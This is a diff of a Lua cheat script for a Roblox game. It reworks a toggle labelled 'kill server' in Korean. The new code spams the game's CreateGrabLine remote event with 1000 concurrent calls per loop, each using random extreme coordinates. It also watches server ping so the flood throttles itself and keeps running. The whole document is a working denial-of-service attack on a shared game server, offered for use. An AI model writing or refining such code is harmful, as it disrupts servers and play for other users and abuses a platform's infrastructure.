@@ -17074,40 +17074,57 @@ ChaosGrabToggle = lagTab:AddToggle({
     end
 })
 
-lagTab:AddToggle({
-    Name = "킬 서버 (폭파)",
+LagTab:AddToggle({
+    Name = "킬 서버",
     Default = false,
     Callback = function(Value)
+        local Stats = game:GetService("Stats")
+        local NetworkStats = Stats.Network.ServerStatsItem -- 서버 관련 통계
+        
         if Value then
-            getgenv().killServerConnection = task.spawn(function()
-                while task.wait() do
-                    if not getgenv().killServerConnection then break end
+            getgenv().killServerRunning = true
+            task.spawn(function()
+                local grabEvents = ReplicatedStorage:WaitForChild("GrabEvents", 5)
+                local createGrabLine = grabEvents and grabEvents:WaitForChild("CreateGrabLine", 5)
+                if not createGrabLine then return end
 
-                    for i = 1, 50 do
-                        task.spawn(function()
-                            local randomPart = workspace:FindFirstChildOfClass("Part")
-                            if randomPart then
-                                ReplicatedStorage.GrabEvents.CreateGrabLine:FireServer(
+                while getgenv().killServerRunning do
+                    
+                    local currentPing = Stats.Network.ServerStatsItem["Data Ping"]:GetValue() 
+                    
+                    if currentPing > 510 then
+                        
+                        repeat
+                            task.wait(0.5)
+                            currentPing = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
+                        until currentPing < 400 or not getgenv().killServerRunning
+                    end
+
+                    
+                    local randomPart = workspace:FindFirstChildOfClass("Part")
+                    if randomPart then
+                        for i = 1, 1000 do
+                            task.spawn(function()
+                                createGrabLine:FireServer(
                                     randomPart,
                                     CFrame.new(
-                                        math.random(-100, 100),
-                                        math.random(-100, 100),
-                                        math.random(-100, 100)
+                                        math.random(-99999, 99999),
+                                        math.random(-99999, 99999),
+                                        math.random(-99999, 99999)
                                     )
                                 )
-                            end
-                        end)
+                            end)
+                        end
                     end
+                    task.wait(0.005) 
                 end
             end)
         else
-            if getgenv().killServerConnection then
-                disconnectConnection(getgenv().killServerConnection)
-                getgenv().killServerConnection = nil
-            end
+            getgenv().killServerRunning = false
         end
     end
 })
+
 do
 local Players = game:GetService("Players")
 local localPlayer = Players.LocalPlayer
